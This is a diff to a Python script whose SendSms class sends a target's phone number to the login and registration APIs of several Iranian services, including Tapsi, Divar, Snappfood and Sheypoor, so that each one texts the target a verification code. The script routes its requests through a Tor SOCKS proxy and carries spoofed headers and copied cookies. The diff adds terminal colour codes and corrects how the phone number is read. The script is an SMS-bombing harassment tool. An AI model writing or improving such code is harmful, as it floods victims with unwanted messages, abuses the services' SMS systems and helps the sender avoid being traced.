@@ -8,6 +8,12 @@ from time import sleep
 from user_agent import generate_user_agent
 import urllib.request
 proxy = {"socks5": "127.0.0.1:9050"}
+r='\033[1;31m'
+g='\033[32;1m' 
+y='\033[1;33m'
+w='\033[1;37m'
+b='\033[1;34m'
+p='\033[1;35m'
 
 
 class SendSms():
@@ -4874,7 +4880,7 @@ class SendSms():
 
     def tap30(self):
         tap30H = {"Host": "tap33.me","Connection": "keep-alive","Content-Length": "63","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "application/json","Accept": "*/*","Origin": "https://app.tapsi.cab","Sec-Fetch-Site": "cross-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://app.tapsi.cab/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
-        tap30D = {"credential":{"phoneNumber":"0"+self.phone("+90"),"role":"PASSENGER"}}
+        tap30D = {"credential":{"phoneNumber":"0"+self.phone("+90")[1],"role":"PASSENGER"}}
         try:
             tap30R = requests.post(timeout=5, url="https://tap33.me/api/v2/user", headers=tap30H, json=tap30D).json()
             if tap30R['result'] == "OK":
@@ -4892,7 +4898,7 @@ class SendSms():
     'referer': 'https://divar.ir/',
     'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
     'x-standard-divar-error': 'true'}
-        divarD = {"phone":self.phone("+90")}
+        divarD = {"phone":self.phone("+90")[1]}
         try:
             divarR = requests.post(timeout=5, url="https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=divarD).json()
             if divarR["authenticate_response"] == "AUTHENTICATION_VERIFICATION_CODE_SENT":
@@ -4912,7 +4918,7 @@ class SendSms():
     'origin': 'https://snappfood.ir',
     'referer': 'https://snappfood.ir/',
     'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
-        sfoodD = {"cellphone": "0"+self.phone("+90")}
+        sfoodD = {"cellphone": "0"+self.phone("+90")[1]}
         try:
             sfoodR = requests.post(timeout=5, url=sfoodU, headers=sfoodH, data=sfoodD).json()
             if sfoodR['status'] == True:
@@ -4923,7 +4929,7 @@ class SendSms():
 
     def sheypoor(self):
         sheyporH = {"Host": "www.sheypoor.com","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0","Accept": "*/*","Accept-Language": "en-US,en;q=0.5","Accept-Encoding": "gzip, deflate, br","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Content-Length": "62","Origin": "https://www.sheypoor.com","Connection": "keep-alive","Referer": "https://www.sheypoor.com/session","Cookie": "plog=False; _lba=false; AMP_TOKEN=%24NOT_FOUND; ts=46f5e500c49277a72f267de92dd51238; track_id=22f97cea33f34e368e4b3edd23afd391; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_session_token=3f475c6e-f55b-0d29-de67-6cdc46bc6592; analytics_token=3cce634d-040a-baf3-fdd6-552578d672df; yektanet_session_last_activity=8/13/2020; _yngt=0bc37b56-6478-488b-c801-521f101259fd; _lbsa=false; _ga=GA1.2.1464689488.1597346921; _gid=GA1.2.1551213293.1597346921; _gat=1","TE": "Trailers"}
-        sheyporD = {"username" : "0"+self.phone("+90")}
+        sheyporD = {"username" : "0"+self.phone("+90")[1]}
         try:
             sheyporR = requests.post(timeout=5, url='https://www.sheypoor.com/auth', headers=sheyporH, data=sheyporD).json()
             if sheyporR['success'] == True:
